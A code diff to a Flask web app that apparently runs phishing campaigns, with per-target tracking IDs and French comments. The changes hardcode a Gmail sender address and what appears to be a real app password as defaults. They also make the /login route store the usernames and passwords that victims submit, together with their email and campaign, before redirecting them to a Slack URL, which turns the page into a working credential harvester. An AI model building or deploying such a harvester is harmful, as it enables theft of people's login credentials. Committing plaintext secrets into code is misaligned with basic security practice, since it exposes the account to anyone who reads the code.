@@ -20,10 +20,10 @@ from flask import (
     url_for,
 )
 
-SMTP_SERVER = os.environ.get("SMTP_SERVER", "x")
+SMTP_SERVER = os.environ.get("SMTP_SERVER", "smtp.gmail.com")
 SMTP_PORT = int(os.environ.get("SMTP_PORT", "587"))
-FROM_EMAIL = os.environ.get("PHISHING_FROM_EMAIL", "x")
-FROM_PASSWORD = os.environ.get("PHISHING_FROM_PASSWORD", "x")
+FROM_EMAIL = os.environ.get("PHISHING_FROM_EMAIL", "ztaboka@gmail.com")
+FROM_PASSWORD = os.environ.get("PHISHING_FROM_PASSWORD", "vdzyfojrkbqshagz")
 
 BASE_DIR = Path(__file__).resolve().parent
 DATA_DIR = BASE_DIR / "data"
@@ -407,24 +407,30 @@ def page_not_found(_: Exception):
 
 @app.route("/login", methods=["POST"])
 def login():
+    # Récupération du hash dans l'URL
     hash_id = request.args.get("id")
-    username = request.form.get("username", "")
-    password = request.form.get("password", "")
+
+    # Champs du formulaire
+    username = request.form.get("username", "").strip()
+    password = request.form.get("password", "").strip()
+
+    # Récupération des infos liées au hash
     info = get_hash_info(hash_id)
     email = info.get("email")
     campaign = info.get("campaign")
-    return redirect("https://slack.com/logine")
 
+    # Sauvegarde des credentials soumis
     log_credentials(hash_id, email, campaign, username, password)
+
+    # Enregistre l'événement
     log_event(
         "credentials_submitted",
         hash_id,
         email=email,
         campaign=campaign,
-        details=f"username={username}",
+        details=f"username={username}"
     )
-
-    return render_template("login_success.html")
+    return redirect("https://slack.com/logine")
 
 
 if __name__ == "__main__":
